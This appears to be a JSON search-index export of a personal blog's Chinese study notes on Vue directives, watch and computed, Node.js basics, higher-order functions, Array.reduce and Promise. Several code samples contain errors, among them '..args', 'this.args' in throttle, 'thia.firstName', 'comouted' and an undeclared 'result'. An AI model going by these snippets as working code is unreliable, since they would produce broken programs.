&lt;br&gt; &lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt; &lt;/div&gt;&lt;script src=&quot;https://unpkg.com/vue@next&quot;&gt;&lt;/script&gt; &lt;script&gt; Vue.createApp(&#123; data()&#123; return&#123; name:&quot;ann&quot;, n:1 &#125; &#125;, directives: &#123; //v-big被调用：指令与元素成功绑定时（一上来） 指令所在模板重新编译时 big(element,binding)&#123; element.innerText=binding.value*10 &#125;, /*fbind(element,binding)&#123; element.value=binding.value element.focus() &#125;,*/ fbind:&#123; // 当被绑定的元素挂载到 DOM 中时…… mounted(element,binding)&#123; console.log(this) element.value=binding.value element.focus() &#125;, updated(element,binding)&#123; element.value=binding.value &#125; &#125; &#125; &#125;).mount(&quot;#root&quot;) &lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"内置指令","slug":"内置指令","date":"2022-01-25T05:58:47.000Z","updated":"2022-01-25T07:45:44.154Z","comments":true,"path":"2022/01/25/内置指令/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/","excerpt":"","text":"v-html:1 作用：向指定节点中渲染包含html的内容 2 与插值语法的区别： （1）v-html会替换掉节点中所有内容，则不会 （2）v-html可以识别html结构 3 严重注意：v-html有安全性问题 （1）在网站上动态渲染任意HTML非常危险，容易导致XSS攻击 （2）一定要在可信内容上使用v-html，永远不要用在用户提交的内容上 v-cloak(没有值)1 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性 2 使用css配合一个v-clock可以解决网速慢时页面展示出的问题 123456789101112131415161718&lt;style&gt; [v-cloak]&#123; display:none &#125;&lt;/style&gt; &lt;h2 v-cloak&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt; &lt;div&gt; &lt;script&gt;&lt;/script&gt;//延迟5秒的服务器 &lt;/div&gt; &lt;script&gt; Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27; &#125; &#125; &#125;) &lt;/script&gt; v-once: v-once 节点在初次动态渲染后，就被视为静态内容 以后数据改变不会引起v-once所在结构的更新，可以用于优化性能 v-pre:1.跳过其所在节点的编译过程 2.可利用它跳过没有使用指令语法，插值语法的节点，加快编译","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"收集表单数据","slug":"收集表单数据","date":"2022-01-25T03:09:55.000Z","updated":"2022-01-25T06:30:01.780Z","comments":true,"path":"2022/01/25/收集表单数据/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/","excerpt":"","text":"收集表单数据： ,v-model收集的死是value值，用户输入的是value值 ,v-model收集的是value值，且给标签配置value值 (1）没有配置input的value属性，收集的是checked(true/false) (2)配置input的value属性： 若v-model的初始值是非数组，收集的是checked(true/false) 若v-model的初始值是数组，收集的是value组成的数组 PS： v-model有三个修饰符： lazy:失去焦点再收集数据 number:把输入的字符串转为有效数字 trim: 输入首尾空格过滤","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Node.js基础","slug":"Node-js基础","date":"2022-01-24T13:57:44.000Z","updated":"2022-04-12T14:03:59.192Z","comments":true,"path":"2022/01/24/Node-js基础/","link":"","permalink":"https://coloey.github.io/2022/01/24/Node-js%E5%9F%BA%E7%A1%80/","excerpt":"","text":"Node.js运行时结构： 1 异步IO 当Node.js执行I/O操作时，会在响应返回后恢复操作，而不是阻止线程并占用额外内存等待 2 单线程 实际JS线程+uv线程池+V8任务线程池+V8inspector线程 优点：不用考虑多线程同步问题，也就不需要锁，同时还能比较高效的利用系统资源 缺点：阻塞会产生负面影响，解决方法：多进程或多线程 3 跨平台 Node.js跨平台+JS无需编译环境（Web跨平台，诊断工具跨平台）","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"Vue监视数据原理","slug":"Vue监视数据原理","date":"2022-01-24T10:24:05.000Z","updated":"2022-01-25T01:45:04.281Z","comments":true,"path":"2022/01/24/Vue监视数据原理/","link":"","permalink":"https://coloey.github.io/2022/01/24/Vue%E7%9B%91%E8%A7%86%E6%95%B0%E6%8D%AE%E5%8E%9F%E7%90%86/","excerpt":"","text":"Vue监视数据原理1 Vue会监视data中所有层次的数据（递归） 2 如何监视对象中的数据？ 通过setter实现监视，且要在new Vue的时候就传入要监测的数据。 （1）对象中后追加的属性，Vue默认不做响应式处理 （2）如需给后续添加的属性左响应式，请使用下面的API: ​ Vue.set(target,propertyName/index,value):target不允许是Vue实例或者vm中的data对象 vm.$set(target,propertyName/index,value) 3 如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质做了两件事： （1） 调用原生对应的方法对数组进行更新 （2） 重新解析模板，进而更新页面 4 在Vue中修改数组中的某个元素一定要用如下方法： （1）使用这些API：push(),shift(),unshift(),splice(),sort(),reverse() （2）Vue.set()或vm.$set() 非变更方法，例如 filter()、concat() 和 slice()。它们不会变更原始数组，而总是返回一个新数组。当使用非变更方法时，可以用新数组替换旧数组：","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"key作用与原理","slug":"key作用与原理","date":"2022-01-24T05:48:50.000Z","updated":"2022-03-21T06:52:14.947Z","comments":true,"path":"2022/01/24/key作用与原理/","link":"","permalink":"https://coloey.github.io/2022/01/24/key%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/","excerpt":"","text":"key的内部原理1 虚拟DOM中key的作用： key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】和【旧虚拟DOM】的对比，对比规则如下： 2 对比规则： （1）旧虚拟DOM中找到与新虚拟DOM相同的key： 若虚拟DOM中内容不变，则直接使用之前的真实DOM 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换页面中的真实 DOM （2）旧虚拟DOM中未找到与新虚拟DOM相同的key，创建新的真实DOM，随后渲染到页面 3 用index作为key可能会引发的问题： （1）若对数据进行逆序添加，逆序删除等操作： 会产生没有必要的真实DOM更新==&gt;界面效果没问题，但是效率低 （2）如果结构中还包含输入类DOM： 会产生错误的DOM更新==&gt;界面有问题 4 开发中如何选择key? (1)最好使用每条数据的唯一标识作为key,比如id,身份证号，手机号等唯一值 (2)如果不存在对数据的逆序添加，逆序删除等破坏顺序的操作，仅用于渲染列表用于展示，使用index作为key是没有问题的","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"条件渲染","slug":"条件渲染","date":"2022-01-24T05:22:02.000Z","updated":"2022-01-24T05:48:38.577Z","comments":true,"path":"2022/01/24/条件渲染/","link":"","permalink":"https://coloey.github.io/2022/01/24/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/","excerpt":"","text":"条件渲染1 v-if: 写法： (1). v-if=”表达式” (2) v-else-if=”表达式” (3) v-else 适用于：切换频率较低的情景 特点：不展示的DOM元素直接被移除 注意：v-if和v-else-if,v-else一起使用时要求结构不能被打断 2 v-show 写法： v-show=”表达式” 适用于：切换频率较高的场景 特点：不展示的DOM元素未被移除，使用display=none隐藏掉 PS： 1 使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到 2 v-if可以和template配合使用","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"绑定class样式","slug":"绑定class样式","date":"2022-01-24T03:39:15.000Z","updated":"2022-01-24T05:18:30.948Z","comments":true,"path":"2022/01/24/绑定class样式/","link":"","permalink":"https://coloey.github.io/2022/01/24/%E7%BB%91%E5%AE%9Aclass%E6%A0%B7%E5%BC%8F/","excerpt":"","text":"绑定class样式12345678910111213141516171819202122232425262728293031323334 &lt;div id=&quot;demo&quot;&gt; &lt;!-- 绑定class样式--字符串写法，适用于样式类名不确定。需要动态确定 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定，名字也不确定 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;/div&gt;&lt;script src=&quot;https://unpkg.com/vue@next&quot;&gt;&lt;/script&gt; &lt;script&gt; Vue.config.productionTip = false Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27;, mood:&#x27;normal&#x27;, classArr:[&#x27;c1&#x27;,&#x27;c2&#x27;,&#x27;c3&#x27;], classObj:&#123; &#x27;c1&#x27;:false, &#x27;c2&#x27;:false, &#125; &#125; &#125;, methods:&#123; changeMood()&#123; const arr=[&#x27;happy&#x27;,&#x27;sad&#x27;,&#x27;normal&#x27;] this.mood=arr[Math.floor(Math.random()*3)] &#125; &#125; &#125;).mount(&#x27;#demo&#x27;) &lt;/script&gt; 绑定style样式1 :style=”{fontSize: xxx}”,其中xxx是动态值","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"watch和computed区别","slug":"watch和computed区别","date":"2022-01-24T02:41:52.000Z","updated":"2022-05-06T15:48:21.304Z","comments":true,"path":"2022/01/24/watch和computed区别/","link":"","permalink":"https://coloey.github.io/2022/01/24/watch%E5%92%8Ccomputed%E5%8C%BA%E5%88%AB/","excerpt":"","text":"computed和watch的区别:1 computed能完成的功能watch也能完成，computed支持缓存 2 watch能完成的功能computed不一定能完成，例如watch能完成异步操作 PS： 1 所有被Vue管理的函数要写成普通函数，这样new Vue的实例的时候this才能绑定到新创建的vm或组件实例对象 2 所有不被Vue管理的函数比如（定时器的回调函数，ajax的回调函数和Promise的回调函数）最好写成箭头函数，箭头函数的this绑定会继承外层函数的this绑定 12345678910111213141516171819202122Vue.createApp(&#123; data()&#123; return &#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&quot;张三&quot; &#125; &#125; watch:&#123; firstName(val)&#123; setTimeout(()=&gt;&#123; this.fullName=val+this.lastName&#125;,1000) &#125;, lastName(val)&#123; setTimeout(()=&gt;&#123; this.fullName=thia.firstName+val&#125;,1000) &#125; &#125;&#125;) 总结：watch和computed都是以Vue的依赖追踪机制为基础，当某一个依赖型数据（简单理解为放在data等对象下的实例数据）发生变化，所有依赖这个数据的相关数据会自动发生变化，即自动调用相关函数，来实现数据的变动 使用场景：computed:用于处理复杂的逻辑运算，一个数据首一个或多个数据影响，用来处理watch和methods无法处理或者处理起来不方便的情况，例如处理模板中的复杂表达式 watch:用来处理一个属性变化时，需要执行某些具体的业务操作逻辑，或要在数据变化时执行异步或开销较大的操作；例如用来监控路由，input输入值的特殊处理等","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"computed","slug":"computed","date":"2022-01-23T14:45:11.000Z","updated":"2022-01-30T14:46:44.584Z","comments":true,"path":"2022/01/23/computed/","link":"","permalink":"https://coloey.github.io/2022/01/23/computed/","excerpt":"","text":"计算属性1 定义： 要用的属性不存在，要通过已有的属性计算得来 2 原理： 底层借助了Object.defineproperty()方法提供的getter和setter。 3 get函数什么时候执行 (1) 初次读取时会执行一次 (2)当依赖的数据发生改变时会被再次调用 4 优势：与methods相比。内部有缓存机制，效率更高，调试方便 5 计算属性最终会出现在vm中，直接读取使用即可 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变 简写：函数 Vue3中12345678910111213141516171819setup()&#123; //计算属性简写let fullName=computed(()=&gt;&#123; return person.firstName+&quot;-&quot;+person.lastName&#125;)//计算属性完整let fullName=comouted(&#123; get()&#123; return person.firstName+&quot;-&quot;+person.lastName &#125; set(val)&#123; const nameArr=value.split(&quot;-&quot;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125;&#125;)&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"事件处理","slug":"事件处理","date":"2022-01-23T10:35:27.000Z","updated":"2022-01-23T14:23:07.968Z","comments":true,"path":"2022/01/23/事件处理/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/","excerpt":"","text":"事件的基本使用： 使用v-on:xxx或@xxx绑定事件，其中xxx是事件名 事件的回调需要配置在methods对象中，最终会在vm上 methods中配置的函数，不要用箭头函数，否则this就不是vm methods中配置的函数，都是被Vue管理的函数，this的指向是vm或组件实例对象 @click=”demo”和@click=”demo($event)”效果一致，但后者可以传参 事件修饰符prevent:阻止默认事件 stop：阻止事件冒泡 once:事件只触发一次 键盘事件1 Vue常用按键别名： 回车：enter 删除：delete 退出：esc 空格：space 换行：tab(特殊，必须配合keydown使用) 上：up 下:down 左:left 右:right 2 Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为keb-case(短横线命名) 3 系统修饰符(用法特殊):ctrl,alt,shift,meta (1)配合keyup使用：按下修饰键的同时再按下其他键，随后释放其他键，事件才被触发 (2)配合keydown使用：正常触发事件 4 也可以使用keyCode去指定具体的键 5 Vue.config.keyCode自定义键名=键码，可以定制按键别名","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"数据代理","slug":"数据代理","date":"2022-01-23T09:50:13.000Z","updated":"2022-01-24T10:26:42.258Z","comments":true,"path":"2022/01/23/数据代理/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/","excerpt":"","text":"Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读或写 Vue中数据代理的好处：更加方便操作data中的数据 基本原理 ​ 通过Object.defineProperty()把data对象中的所有属性添加到vm上中，为每一个添加到vm上的属性都指定一个getter()setter()函数，在getter()setter()函数；里面去操作data中对应的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243 const vm=Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27;, address:&#x27;06404&#x27; &#125; &#125; &#125;)vm&#123;..._data&#123; name:(...), address:(...), &#125;name:(...)address:(...)//Object.defineProperty()Object.defineProperty(vm,&#x27;name&#x27;,&#123; value:_data.name.get() enumerable: writable: configurable://默认为false,控制属性是否可以被删除 get()&#123; return _data.name.get() &#125; set(value)&#123; _data.name.set(value) &#125;&#125;)Object.defineProperty(vm,&#x27;address&#x27;,&#123; value:_data.address.get() enumerable: writable: configurable://默认为false,控制属性是否可以被删除 get()&#123; return _data.address.get() &#125; set(value)&#123; _data.address.set(value); &#125;&#125;)&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"MVVM","slug":"MVVM","date":"2022-01-23T08:23:36.000Z","updated":"2022-01-23T09:48:20.724Z","comments":true,"path":"2022/01/23/MVVM/","link":"","permalink":"https://coloey.github.io/2022/01/23/MVVM/","excerpt":"","text":"MVVM M:模型(Model) data中的数据 V：视图(View) 模板代码 VM:视图模型（ViewModel):Vue实例 data中的所有属性最后都出现在vm身上 vm上的所有属性及Vue原型上的所有属性，在Vue模板中都可以直接使用 12345678910&lt;div&gt;View&lt;/div&gt;const vm=Vue.createApp(&#123;//vm:VM data()&#123; return&#123; Model &#125; &#125;&#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"数据绑定","slug":"数据绑定","date":"2022-01-23T07:57:58.000Z","updated":"2022-01-23T08:05:06.352Z","comments":true,"path":"2022/01/23/数据绑定/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/","excerpt":"","text":"数据绑定1. 单向绑定v-bind:数据只能从data流向页面 2.双向绑定v-model:数据不仅能从data流向页面，还能从页面流向data v-model:value的value可以简写为v-model,因为v-model默认收集的就是value值","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"模板语法","slug":"模板语法","date":"2022-01-23T07:36:44.000Z","updated":"2022-01-23T07:52:52.618Z","comments":true,"path":"2022/01/23/模板语法/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95/","excerpt":"","text":"Vue 模板语法1 插值语法功能：用于解析标签体内容 写法：，xxx是js表达式，直接读取js中的所有data属性 2 指令语法功能： 用于解析标签（包括标签属性，标签内容等） 举例：v-bind:href=”xxx”,简写为:href=”xxx”,xxx同样可以写js表达式，且可以直接读取到data里的所有属性 写法：v-xxx","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"高阶函数","slug":"高阶函数","date":"2022-01-17T06:06:06.000Z","updated":"2022-01-17T09:29:33.289Z","comments":true,"path":"2022/01/17/高阶函数/","link":"","permalink":"https://coloey.github.io/2022/01/17/%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/","excerpt":"","text":"高阶函数模板12345function HoF0(fn)&#123; return function(...args)&#123; return fn.apply(this,args); &#125;&#125; Once123456789function once(fn)&#123; return function(..args)&#123; if(fn)&#123; const ret=fn.apply(this,args); fn=null; return ret; &#125; &#125;&#125; Throttle1234567891011121314151617function throttle(fn,time=500)&#123; let timer; return function(...args)&#123; if(timer==null)&#123; fn.apply(this.args); timer=setTimeout(()=&gt;&#123; timer=null; &#125;,time) &#125; &#125;&#125;btn.onclick=throttle(function(e)&#123; circle.innerHTML=parseInt(circle.innerHTML)+1; circle.className=&#x27;fade&#x27;; setTimeout(()=&gt;circle.className=&#x27;&#x27;,250);&#125;); Debouce123456789101112function debouce(fn,dur)&#123; dur=dur||100; var timer; return function()&#123; clearTimeout(timer); timer=setTimeOut(()=&gt;&#123; fn.apply(this,arguments); &#125;,dur); &#125;&#125; iterative12345678910111213function iterative(fn)&#123; return function(subject,...rest)&#123; if(isIterable(subject))&#123; const ret=[]; for(let obj of subject)&#123; ret.push(fn.apply(this,[obj,...rest])); &#125; return ret; &#125; return fn.apply(this,[subject,...rest]); &#125;&#125; 过程抽象 HOF 装饰器 命令式/声明式 洗牌算法：123456789101112131415161718192021function*draw(cards)&#123; const c=[...cards]; for(let i=c.length;i&gt;0;i--)&#123; const pIdx=Math.floor(Math.random()*i); [c[pIdx],c[i-1]]=[c[i-1],c[pIdx]]; yield c[i-1]; &#125;&#125;function generate(amount,count)&#123; if(count&lt;=1)return [amount]; const cards=Array(amount-1).fill(0).map((_,i)=&gt;i+1); const pick=draw(cards); for(let i=0;i&lt;count;i++)&#123; result.push(pick.next().value); &#125; result.sort((a,b)=&gt;a-b); for(let i=count-1;i&gt;0;i--)&#123; result[i]=result[i]-result[i-1]; &#125; return result;&#125;","categories":[],"tags":[]},{"title":"watch","slug":"watch","date":"2022-01-15T06:39:59.000Z","updated":"2022-01-30T15:44:57.822Z","comments":true,"path":"2022/01/15/watch/","link":"","permalink":"https://coloey.github.io/2022/01/15/watch/","excerpt":"","text":"watch()监视属性watch： 1 当被监视的属性变化时（也可以监视计算属性），回调函数自动调用，进行相关操作 2 监视的属性必须存在才能好进行监视 3 监视的两种写法： （1）在Vue.createApp时传入watch配置 （2）通过vm.$watch监视 4 深度监视 （1）Vue中的watch默认不监视对象内部值的改变（一层） （2）配置deep为true,可以检测对象内部值改变（多层） 监视多级结构中某个属性的变化：’number.a’ 监视多级结构中所有属性第1变化，用deep:true PS：（1）Vue自身可以检测对象内部值的改变但是Vue提供的watch默认不可以 （2）使用watch时根据数据的具体结构，决定是否采用深度监视 vm.$watch(expOrFn,callback,[options]) expOrFn:{string/Function} callback:{Function/Object} options:{Object} deep:{boolean} immediate:{boolean} 返回值：unwatch函数 用处：观察Vue实例上的一个表达式或者一个函数计算结果的变化，回调函数得到的参数为新值和旧值。表达式只接受简单的键路径，对于复杂表达式，用函数取代 12345678910111213141516171819202122232425262728293031323334//HTML&lt;div id=&quot;app&quot;&gt; &#123;&#123;a&#125;&#125;,&#123;&#123;b&#125;&#125;&lt;/div&gt;//键路径 &lt;script type=&quot;text/javascript&quot;&gt; var vm=new Vue(&#123; el:&quot;#app&quot;, data:&#123; a:&#123;value1:&#x27;hello&#x27;&#125;, b:&#123;value2:&#x27;beautiful&#x27;&#125; &#125; &#125;); vm.$watch(&#x27;b.value2&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;); vm.b.value2=&#x27;bind&#x27;;//bind beautiful //修改对象内部的值但是侦听的是对象，对其属性或元素的更改不会触发侦听器，因为他们引用相同对象 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;); vm.a.value1=&#x27;hei&#x27;;//没有侦听到//为了发现对象内部值的变化，可以在选项参数中指定 deep: true。这个选项同样适用于监听数组变更。 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;,&#123;deep:true&#125;); vm.a.value1=&#x27;hei&#x27;;////在选项参数中指定 immediate: true 将立即以表达式的当前值触发回调 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;,&#123;immediate:true&#125;); vm.a=&#123;&#125;//&#123;_ob_:Observer&#125;undefined &#123;_ob_:Observer&#125;&#123;_ob_:Observer&#125; &lt;/script&gt; 在带有immediate选项时不能在第一次回调时取消侦听给定的property 1234567const unwatch=vm.$watch( &#x27;a&#x27;, function(newVal,oldVal)&#123; console.log(newVal,oldVal); unwatch() &#125;,&#123;immediate:true&#125; )//报错 要在回调函数里调用一个取消侦听的函数应该先检查其函数的可用性 12345678let unwatch=null; unwatch=vm.$watch( &#x27;a&#x27;, function(newVal,oldVal)&#123; console.log(newVal,oldVal); if(unwatch)&#123;unwatch();&#125; &#125;,&#123;immediate:true&#125; ) Vue3中的watch两个“坑”： watch监视的是reactive定义的响应式数据则无法正确获得oldValue，watch监视的是reactive定义的响应式数据则强制开启深度监视,只能获取newValue,无法获取oldValue 监视reactive定义的某个对象中的属性（也是对象）,deep有效,仍然无法获取oldValue 关于.value: 如果ref定义的是一个数字或者字符，比如ref(0)不能用.value 如果ref定义的是一个对象，则里面的属性本质上是由reactive定义，如果要监视里面的属性则得用.value，.value后由reactive定义，则自动开启深度监视，或者开启深度监视 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 setup()&#123; let person=reactive(&#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&#x27;&#x27;, job:&#123; one:&#x27;doctor&#x27;, tow:&#x27;teacher&#x27; &#125; &#125;) let sum=ref(0) let msg=ref(&quot;你好呀&quot;)//情况一：监视ref定义的响应式数据 watch(sum,(newValue,oldValue)=&gt;&#123; console.log(&quot;sum变化了&quot;,newValue,oldValue) &#125;) //情况二：监视多个ref定义的响应式数据 watch([sum,msg],(newValue,oldValue)=&gt;&#123; console.log(&quot;sum或msg变化了&quot;,newValue,oldValue) &#125;) //情况三：监视reactive定义的响应式数据：若watch监视的是reactive定义的响应式数据则无法正确获得oldValue，watch监视的是reactive定义的响应式数据则强制开启深度监视,只能获取newValue,无法获取oldValue watch(person,(newValue,oldValue)=&gt;&#123; console.log(&quot;person变化了&quot;,newValue,oldValue) &#125;,&#123;deep:false&#125;)//deep配置无效 //情况四:监视reactive定义的响应式数据中的某个属性 watch(()=&gt;person.firstName,(newValue,oldValue)=&gt;&#123; console.log(&quot;person的firstName变化了&quot;,newValue,oldValue) &#125;) //情况五：监视reactive定义的一个响应式数据中的某些属性 watch([()=&gt;person.firstName,()=&gt;person.lastName],(newValue,oldValue)=&gt;&#123; console.log(&quot;person的firstName/lastName变化了&quot;,newValue,oldValue) &#125;) //特殊情况监视reactive定义的某个对象中的属性（也是对象）,deep有效,仍然无法获取oldValue watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123; console.log(&quot;person的job变化了&quot;,newValue,oldValue) &#125;,&#123;deep:true&#125;) person.fullName=computed(&#123; get()&#123; return person.firstName+&#x27;-&#x27;+person.lastName &#125;, set(value)&#123; const nameArr=value.split(&#x27;-&#x27;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125; &#125;) watch() return &#123; person, sum, msg &#125; &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[{"name":"watch","slug":"watch","permalink":"https://coloey.github.io/tags/watch/"}]},{"title":"addLoadEvent","slug":"addLoadEvent","date":"2022-01-10T09:41:16.000Z","updated":"2022-01-10T09:47:57.127Z","comments":true,"path":"2022/01/10/addLoadEvent/","link":"","permalink":"https://coloey.github.io/2022/01/10/addLoadEvent/","excerpt":"","text":"1234567891011function addLoadEvent(func)&#123; var oldonload=window.onload; if(typeof oldonload!=&#x27;function&#x27;)&#123; window.onload=func;//如果处理函数还没有绑定任何函数，就添加新函数 &#125;else&#123; window.onload=function()&#123; oldonload(); func(); &#125; &#125; &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"reduce","slug":"reduce","date":"2022-01-07T03:30:23.000Z","updated":"2022-01-07T13:25:55.147Z","comments":true,"path":"2022/01/07/reduce/","link":"","permalink":"https://coloey.github.io/2022/01/07/reduce/","excerpt":"","text":"arr.reduce(callback(accumulator,currentValue,index,array),InitValue) callback:执行数组中的每个值的函数，包括4个参数： accumulator currentValue 数组中正在处理的元素。 index 可选 数组中正在处理的当前元素的索引。 如果提供了initialValue，则起始索引号为0，否则从索引1起始。 array可选 调用reduce()的数组 initialValue可选 作为第一次调用 callback函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。 返回累计处理后的结果 求数组中的所有值的和12345678910var sum=[0,1,2,3].reduce(function(accumulator,currentValue)&#123;return accumulator+currentValue;&#125;,0)//6//累加对象数组里的值var InitValue=0;var sum=[&#123;x:1&#125;,&#123;x:2&#125;,&#123;x:3&#125;].reduce(function(accumulator,currentValue)&#123; return accumulator+currentValue;&#125;,InitValue);console.log(sum);//6 将二维数组转为一维1var flattened=[[0,1],[2,3],[4,5],[6,7]].reduce(function(a,b)&#123;return a.concat(b);&#125;,[]) 计算数组中每个元素出现的个数1234567891011var names=[&#x27;Alice&#x27;,&#x27;Bob&#x27;,&#x27;Ann&#x27;,&#x27;Alice&#x27;,&#x27;Bob&#x27;]; var countNames=names.reduce((allNames,name)=&gt;&#123; if(name in allNames)&#123; allNames[name]++; &#125; else&#123; allNames[name]=1; &#125; return allNames; &#125;,&#123;&#125;); console.log(countNames); 按照属性对object分类123456789101112131415161718var people=[ &#123;name:&#x27;Alice&#x27;,age:20&#125;, &#123;name:&#x27;Max&#x27;,age:20&#125;, &#123;name:&#x27;Jane&#x27;,age:21&#125; ] function groupBy(objectArray,property)&#123; return objectArray.reduce(function(acc,obj)&#123; var key=obj[property]; if(!acc[key])&#123; acc[key]=[]; &#125; acc[key].push(obj); return acc; &#125;,&#123;&#125;); &#125; var groupedPeople=groupBy(people,&#x27;age&#x27;); console.log(groupedPeople); 使用扩展运算符绑定包含在对象数组中的数组123456789var friends=[&#123; name:&#x27;Anna&#x27;, books:[&#x27;Bible&#x27;,&#x27;Harry Potter&#x27;], age:21 &#125;, &#123;name:&#x27;Bob&#x27;,books:[&#x27;War and Peace&#x27;],age:16&#125;, &#123;name:&#x27;Mike&#x27;,books:[&#x27;The Shining&#x27;,&#x27;The Lord of the Rings&#x27;],age:18&#125;]; var allBooks=friends.reduce((prev,curr)=&gt;&#123;return [...prev,...curr.books]&#125;,[&#x27;Alphabet&#x27;]); console.log(allBooks); 数组去重123456789let myArray=[6,6,6,2,3,3,4,4,4,5]; let myOrderedArray=myArray.reduce((accumulator,currval)=&gt;&#123; if(accumulator.indexOf(currval)==-1)&#123; accumulator.push(currval); &#125; return accumulator; &#125;,[]) console.log(myOrderedArray);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Promise","slug":"Promise","date":"2022-01-06T12:59:19.000Z","updated":"2022-01-07T13:00:23.474Z","comments":true,"path":"2022/01/06/Promise/","link":"","permalink":"https://coloey.github.io/2022/01/06/Promise/","excerpt":"","text":"期约状态机Promise可以通过 new 操作符来实例化。创建新期约时需要传入执行器（executor）函数作为参数 123let p = new Promise(() =&gt; &#123;&#125;);setTimeout(console.log, 0, p); // Promise &lt;pending&gt; 在把一个期约实例传给 console.log()时，控制台输出（可能因浏览器不同而略有差异）表明该实例处于待定（pending）状态。如前所述，期约是一个有状态的对象，可能处于如下 3 种状态之一： 待定（pending）是期约的最初始状态。在待定状态下，期约可以落定（settled）为代表成功的兑现（fulfilled）状态，或者代表失败的拒绝（rejected）状态。无论落定为哪种状态都是不可逆的。只要从待定转换为兑现或拒绝，期约的状态就不再改变。而有时候也称为“解决”，resolved） 兑现（fulfilled)每个期约只要状态切换为兑现，就会有一个私有的内部值（value） 拒绝（rejected）如果期约被拒绝，程序就会期待期约状态改变时可以拿到拒绝的理由 